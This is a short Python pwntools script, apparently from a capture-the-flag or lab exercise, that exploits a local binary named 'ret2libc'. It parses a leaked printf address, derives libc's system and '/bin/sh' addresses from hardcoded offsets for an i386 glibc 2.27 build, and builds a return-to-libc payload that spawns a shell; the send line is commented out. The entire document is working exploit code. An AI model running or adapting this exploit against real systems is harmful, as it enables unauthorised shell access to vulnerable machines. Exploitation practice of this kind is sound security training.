from pwn import *
from lib import *
context.log_level = 'ERROR'

p, e = start('./ret2libc', args)
l = ELF('libc6_2.27-3ubuntu1_i386.so')

p.recvuntil(b': ')
printf = int(p.recvuntil(b'\n', drop=True), 16)
system = printf + 0x140D0


l.address = printf - l.symbols['printf']


# system = l.symbols['system'] # base + 0x3d200
bin_sh = l.address + 0x17e0cf

print(f'{hex(system)} {hex(bin_sh)} {hex(printf)}')

payload = b'A' * 0x14
payload += p32(system) # CALL SYSTEM 
payload += p32(0xdeadbeef)      # padding
payload += p32(bin_sh) # &('/bin/sh')
pause()
# p.sendline(payload)

p.interactive()
p.close()
